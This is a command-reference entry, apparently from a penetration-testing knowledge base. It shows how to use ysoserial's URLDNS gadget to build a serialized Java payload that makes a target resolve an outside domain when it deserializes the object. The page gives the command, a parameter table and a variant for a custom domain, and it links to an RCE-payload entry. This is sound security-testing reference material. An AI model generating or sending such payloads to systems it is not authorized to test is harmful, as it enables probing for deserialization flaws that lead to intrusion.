---
id: cmd-java-urldns
data: >-
  java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://testing1.jexboss.info
  > payload
tags:
  - payload
  - java
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:27.657Z'
verified: false
validated: true
submitted: true
---
# java-generate-urldns-payload

## Command

```bash
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://testing1.jexboss.info > payload
```

## Description

Generates a serialized Java payload using the URLDNS gadget to trigger a DNS lookup to the specified domain upon deserialization.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -jar | Runs the JAR file | Yes |
| ysoserial-0.0.6-SNAPSHOT-all.jar | Ysoserial executable | Yes |
| URLDNS | Gadget type for URL/DNS interaction | Yes |
| http://testing1.jexboss.info | Domain to trigger DNS query | Yes |
| > payload | Redirects output to payload file | Yes |

## Examples

### Basic Usage

```bash
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://testing1.jexboss.info > payload
```

### Advanced Usage

```bash
java -jar ysoserial.jar URLDNS http://custom.domain > custom_payload
```

## Expected Output

Binary serialized object written to 'payload' file (no console output due to redirection).

## Related

- [[commands/curl-send-rce-payload]]
- [[procedures/Generate-DNS-Lookup-Payload]]
